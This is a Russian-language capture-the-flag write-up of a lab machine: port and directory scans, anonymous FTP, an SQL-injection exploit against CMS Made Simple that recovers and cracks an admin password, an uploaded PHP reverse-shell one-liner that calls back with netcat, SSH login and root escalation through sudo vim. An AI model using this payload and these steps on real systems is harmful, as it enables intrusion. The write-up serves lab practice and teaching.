# Отчет о пентесте целевой машины

## Сканирование портов и обнаружение служб (Nmap)

Запустим `nmap -A IP_ADDR`:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-09 16:53 -0400
Nmap scan report for 10.82.183.41
Host is up (0.049s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.129.112
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 4.X|5.X|3.X (91%), Crestron 2-Series (86%), Google Android 10.X|11.X|12.X (85%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 4.15 (90%), Linux 3.10 - 3.13 (88%), Crestron XPanel control system (86%), Linux 3.8 - 3.16 (86%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   47.57 ms 192.168.128.1
2   ...
3   48.65 ms 10.82.183.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.66 seconds
```
## Перебор директорий (Gobuster)

Запустим gobuster командой `gobuster dir -u http://10.82.183.41 -w /usr/share/wordlists/dirb/small.txt -x php`

Вывод:
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.183.41
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
simple               (Status: 301) [Size: 313] [--> http://10.82.183.41/simple/]
Progress: 1918 / 1918 (100.00%)
===============================================================
Finished
===============================================================
```
Если зайти на страничку simple, то можно внизу заметить версию cms 2.2.8, в ней есть уязвимость CVE-2019-9053, к ней я вернусь чуть позже.

Отсюда видно, что есть единственная директория simple, можно просканировать еще и ее:
```
gobuster dir -u http://10.82.183.41/simple -w /usr/share/wordlists/dirb/small.txt -x php

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.183.41/simple
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 301) [Size: 319] [--> http://10.82.183.41/simple/admin/]
assets               (Status: 301) [Size: 320] [--> http://10.82.183.41/simple/assets/]
config.php           (Status: 200) [Size: 0]
doc                  (Status: 301) [Size: 317] [--> http://10.82.183.41/simple/doc/]
index.php            (Status: 200) [Size: 19913]
lib                  (Status: 301) [Size: 317] [--> http://10.82.183.41/simple/lib/]
install.php          (Status: 301) [Size: 0] [--> /simple/install.php/index.php]
modules              (Status: 301) [Size: 321] [--> http://10.82.183.41/simple/modules/]
tmp                  (Status: 301) [Size: 317] [--> http://10.82.183.41/simple/tmp/]
uploads              (Status: 301) [Size: 321] [--> http://10.82.183.41/simple/uploads/]
Progress: 1918 / 1918 (100.00%)
===============================================================
Finished
===============================================================
```
Я прошелся по всем этим директориям, но ничего интересного, кроме админки, не нашел. Как я понял, все остальные директории будут доступны полноценно после получения доступа к админке.

## Эксплуатация уязвимости CVE-2019-9053

Как я уже и говорил выше, версия CMS 2.2.8 и 2.2.9 в том числе имеют уязвимость CVE-2019-9053, которая работает за счет time-based SQL-инъекции в параметр m1_idlist. Естественно, я не буду вытаскивать по одному символу информации вручную, поэтому на GitHub я нашел Python-скрипт, эксплуатирующий эту уязвимость. Ссылка: https://github.com/Slayerma/-CVE-2019-9053.

Запускаю его командой python exploit_2019.py -u http://10.80.171.112 -w Downloads/rockyou.txt, но сразу после начала подбора пароля выскакивает ошибка с чтением словаря, прописываю в строке open(wordlist) параметр error='ignore'.

Еще раз, после перебора пароля выскакивает уже другая ошибка, связанная с кодировкой UTF-8. В суть ошибки я не вникал сильно, потому что поджимало время, но, посоветовавшись с нейросетью, она сказала, что 57 строку можно заменить на `if hashlib.md5((str(salt) + line).encode('utf-8')).hexdigest() == password:`, и я так и сделал. Все заработало. Однако спустя 20 минут подбора пароля скрипт просто оборвался, да и мне кажется, что это не особо эффективно. Эффективнее было бы сразу достать хеш полностью и потом уже его подобрать.

## Исследование FTP-сервера

Так же я решил попробовать зайти по ftp:
```
┌──(kali㉿kali)-[~]
└─$ ftp 10.80.168.34
Connected to 10.80.168.34.
220 (vsFTPd 3.0.3)
Name (10.80.168.34:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |********************************************************|   166      233.25 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (3.60 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~]
└─$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
Смею предположить, что если файл называется Mitch, то, допустим, это кусок кредов от админки, я запишу это.

## Использование SearchSploit

Можно попробовать другие пути. Через searchsploit я еще не искал эксплойты для cms 2.2.8, попробую:
```
searchsploit cms 2.2.8

------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Bolt CMS < 3.6.2 - Cross-Site Scripting                            | php/webapps/46014.txt
CMS Made Simple < 2.2.10 - SQL Injection                           | php/webapps/46635.py
Composr-CMS Version <=10.0.39 - Authenticated Remote Code Executio | php/webapps/51060.txt
Concrete CMS < 5.5.21 - Multiple Vulnerabilities                   | php/webapps/37225.pl
Concrete5 CMS < 5.4.2.1 - Multiple Vulnerabilities                 | php/webapps/17925.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration            | php/webapps/44194.py
DeDeCMS < 5.7-sp1 - Remote File Inclusion                          | php/webapps/37423.txt
Drake CMS < 0.2.3 ALPHA rev.916 - Remote File Inclusion            | php/webapps/2713.txt
Kirby CMS < 2.5.7 - Cross-Site Scripting                           | php/webapps/43140.txt
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                     | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                     | php/webapps/44646.txt
Mura CMS < 6.2 - Server-Side Request Forgery / XML External Entity | cfm/webapps/43045.txt
Redaxo CMS Mediapool Addon < 5.5.1 - Arbitrary File Upload         | php/webapps/44891.txt
zKup CMS 2.0 < 2.3 - Arbitrary File Upload                         | php/webapps/5220.php
zKup CMS 2.0 < 2.3 - Remote Add Admin                              | php/webapps/5219.php
------------------------------------------------------------------- ---------------------------------
```
Скопируем нужный нам эксплойт на второй строке командой `searchsploit -m 46635`:
```
Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/46635.py
```
После нескольких ужасно муторных моментов с удалением библиотеки termcolor из python2 скрипта (т.к. она просто не устанавливалась), решения проблемы с тем, что питон 2 не понимает кириллицу, я все-таки запустил скрипт. Запуск производится командой `python2 46635.py -u http://IP_ADDR/simple --crack -w /usr/share/wordlists/rockyou.txt`

На выходе получаем данные:
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
Пробуем войти в админку под этими кредами.

## Получение reverse-shell через File Manager

Зайдя в админку, я сразу же зацепился за файл менеджер и заметил, что можно загружать туда свои файлы. Пробую загрузить туда скрипт, который у меня был в формате .phtml.

Код скрипта:

`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>`

С атакующей машины запускаю netcat: nc -lnvp 8000

Успешно подключаюсь к машине под самым нищим пользователем www-data. Ну ничего, сейчас мы это поправим (думал я, но нет). Поправить я этого не смог, потому что у меня буквально нет прав ни на что, даже банально посмотреть пользовательский флаг.

## Подключение по SSH и получение пользовательского флага

Значит, придется подключаться по ssh:  `ssh mitch@10.81.132.13`. Ах да, вспоминаем, что у нас ssh находится на порту 2222, поэтому добавим -p 2222. Переходим в папку /home, там, кстати, есть еще один юзер sunbath, но мы переходим в /home/mitch и берем наш флаг в файле user.txt:

`G00d j0b, keep up!`

## Эскалация привилегий

Далее мне нужно искать векторы эскалации привилегий, начнем как обычно с `find / -perm -4000 2>/dev/null`, но на выходе я ничего интересного не получаю. Пробую `sudo -l` и вижу мою золотую жилу — vim без пароля.

На GTFOBins нахожу команду для эскалации привилегий: `vim -c ':py ...'`. Она с помощью vim запускает файл Python. Однако когда я попытался это сделать, мне выдало, что vim этой версии не поддерживает py, поэтому пойдем попроще:
```
sudo vim
:!/bin/bash
```
И меня сразу выкидывает в рутовый шелл. Переходим в директорию /root, открываем файл root.txt и получаем флаг:

`W3ll d0n3. You made it!`
